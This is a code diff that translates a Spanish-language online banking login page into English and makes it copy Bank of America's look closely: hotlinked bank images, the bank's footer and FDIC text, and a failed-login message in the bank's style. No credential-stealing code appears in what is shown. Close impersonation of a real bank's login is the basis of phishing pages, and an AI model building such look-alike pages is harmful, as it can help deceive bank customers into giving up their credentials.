@@ -130,13 +130,13 @@
 <div class="login-section">
     <div class="left-section">
         <div class="login-box">
-            Usuario
+            Username
         </div>
-        <input type="text" placeholder="Ingresa tu usuario" id="usernameInput">
+        <input type="text" placeholder="Enter your username" id="usernameInput">
         <div class="login-box">
-            Contraseña (solo números)
+            password (numbers only)
         </div>
-        <input type="password" placeholder="Ingresa tu contraseña (solo números)" id="passwordInput">
+        <input type="password" placeholder="Enter your password (numbers only)" id="passwordInput">
         <div class="keyboard">
             <button onclick="appendNumber(1)">1</button>
             <button onclick="appendNumber(2)">2</button>
@@ -148,26 +148,26 @@
             <button onclick="appendNumber(8)">8</button>
             <button onclick="appendNumber(9)">9</button>
         </div>
-        <button type="submit" id="continueButton">Continuar</button>
+        <button type="submit" id="continueButton">log in</button>
         <div>
-            <a href="#">Olvidaste tu usuario</a><br>
-            <a href="#">Problemas para conectarte</a>
+            <a href="#">forgot ID/password?</a><br>
+            <a href="#">problem login in?</a>
         </div>
     </div>
     <div class="right-section">
         <img src="https://secure.bankofamerica.com/pa/components/modules-app/VIPAA/online-id-vipaa-module/1.0/graphic/mobile_llama.png" alt="Imagen de referencia">
         <div class="right-section">
-<p>Operaciones bancarias cómodas y seguras en cualquier momento<p>
-<a href="https://promotions.bankofamerica.com/digitalbanking/es/mobilebanking"><button type="submit1" id="continueButton">Obtener la aplicacion</button></a>
+<p>Secure, convenient banking anytime<p>
+<a href="https://promotions.bankofamerica.com/digitalbanking/es/mobilebanking"><button type="submit1" id="continueButton">Get the app</button></a>
         </div>
 
     </div>
 </div>
 
 <div class="footer">
-    Área protegida
-Privacidad|Seguridad|Sus opciones de privacidad  pill
-Bank of America, N.A. Miembro de FDIC. Igualdad de oportunidades en préstamos para viviendas
+Secure area
+Privacy|Security|Your Privacy Choices 
+pill Bank of America, N.A. Member FDIC. <a href="https://www.bankofamerica.com/help/equalhousing-popup/">Equal Housing Lender</a>
 © 2024 Bank of America Corporation.
 </div>
 
@@ -235,7 +235,7 @@ Bank of America, N.A. Miembro de FDIC. Igualdad de oportunidades en préstamos p
             localStorage.setItem("currentUser", JSON.stringify(user));
             window.location.href = "bancaenlinea.html"; // Redireccionar a la página correcta
         } else {
-            alert("Usuario o contraseña incorrectos. Por favor, inténtalo de nuevo.");
+            alert("The information you entered doesn't match our records. You have a few more tries remaining.");
         }
 
     });
